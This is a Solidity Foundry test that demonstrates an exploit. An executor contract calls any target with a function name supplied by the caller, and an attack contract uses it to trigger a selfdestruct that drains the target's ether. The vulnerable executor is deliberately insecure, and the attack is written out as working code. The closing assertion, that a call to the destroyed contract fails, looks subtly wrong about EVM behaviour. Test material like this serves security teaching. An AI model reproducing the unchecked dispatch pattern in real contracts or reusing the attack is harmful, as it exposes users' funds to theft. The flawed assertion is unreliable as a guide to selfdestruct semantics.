pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contracts

contract VulnerableTarget {
    function pwn() external {
        selfdestruct(payable(msg.sender));
    }
}

contract UnsafeCommandExecutor {
    string public lastExecutedCommand;

    function executeCommand(address target, string calldata command) external payable returns (bytes memory) {
        lastExecutedCommand = command;
        (bool success, bytes memory data) = target.call(abi.encodeWithSignature(string(abi.encodePacked(command, "()"))));
        require(success, "Command execution failed");
        return data;
    }
}

contract Attack {
    UnsafeCommandExecutor public executor;
    VulnerableTarget public target;

    constructor(address _executor, address _target) {
        executor = UnsafeCommandExecutor(_executor);
        target = VulnerableTarget(_target);
    }

    function attack() external {
        // Passing 'pwn' as the command triggers target.pwn(), which calls selfdestruct
        executor.executeCommand(address(target), "pwn");
    }
}

contract UnsafeExternalCommandExecutionTest is Test {
    VulnerableTarget target;
    UnsafeCommandExecutor executor;
    Attack attack;
    address attacker = address(0xABcD);

    function setUp() public {
        // Deploy the contracts
        target = new VulnerableTarget();
        executor = new UnsafeCommandExecutor();
        attack = new Attack(address(executor), address(target));

        // Fund the target with 1 ether so that selfdestruct transfers funds
        vm.deal(address(target), 1 ether);
    }

    function testExploit() public {
        // Verify initial balance of target
        assertEq(address(target).balance, 1 ether, "VulnerableTarget should have 1 ether before attack");

        // Simulate the attack from the attacker address
        vm.prank(attacker);
        attack.attack();

        // After selfdestruct, target should have no balance
        assertEq(address(target).balance, 0, "VulnerableTarget balance should be 0 after selfdestruct");

        /*
         Since selfdestruct removes the contract code, any call to the target should
         fail (or return false) because there is no code to execute. We test that by
         attempting to call pwn() again and expecting the call to fail.
        */
        (bool callSuccess, ) = address(target).call(abi.encodeWithSignature("pwn()"));
        assertFalse(callSuccess, "VulnerableTarget should not be callable after selfdestruct");
    }
}
